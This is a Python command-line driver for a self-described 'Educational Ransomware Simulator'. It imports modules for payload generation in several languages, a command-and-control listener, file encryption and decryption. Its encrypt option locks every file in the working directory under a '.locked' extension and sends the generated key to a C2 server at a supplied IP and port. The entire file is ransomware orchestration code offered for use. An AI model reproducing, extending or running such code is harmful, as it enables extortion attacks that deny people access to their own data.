import argparse
from payloads.generate_payloads import generate_payload
from encryption.encryptor import encrypt_files
from encryption.decryptor import decrypt_files
from c2.c2_listener import start_listener
from c2.c2_client import send_key_to_c2
from cryptography.fernet import Fernet

def main():
    parser = argparse.ArgumentParser(description="Educational Ransomware Simulator")
    parser.add_argument("--generate", choices=["python", "powershell", "c++"], help="Generate a payload script.")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt files in the current directory.")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt files in the current directory.")
    parser.add_argument("--listen", action="store_true", help="Start a C2 listener.")
    parser.add_argument("--ip", type=str, help="C2 server IP address.")
    parser.add_argument("--port", type=int, help="C2 server port.")
    parser.add_argument("--key", type=str, help="Encryption/Decryption key (required for decryption).")
    args = parser.parse_args()

    if args.listen:
        if args.ip and args.port:
            start_listener(args.ip, args.port)
        else:
            print("[-] Please specify IP and port for the listener (--ip and --port).")

    elif args.generate:
        if args.ip and args.port:
            generate_payload(args.generate, args.ip, args.port)
        else:
            print("[-] Please specify IP and port for the payload (--ip and --port).")

    elif args.encrypt:
        if args.ip and args.port:
            # Generate a new encryption key
            key = Fernet.generate_key()
            # Encrypt files in the current directory
            encrypt_files('.', key, new_extension=".locked")
            # Send the key to the C2 server
            send_key_to_c2(args.ip, args.port, key)
        else:
            print("[-] Please specify IP and port to send the encryption key (--ip and --port).")

    elif args.decrypt:
        if args.key:
            # Use the provided key to decrypt files
            key = args.key.encode()  # Convert the key string to bytes
            decrypt_files('.', key, encrypted_extension=".locked")
        else:
            print("[-] Please provide the decryption key (--key).")

if __name__ == "__main__":
    main()
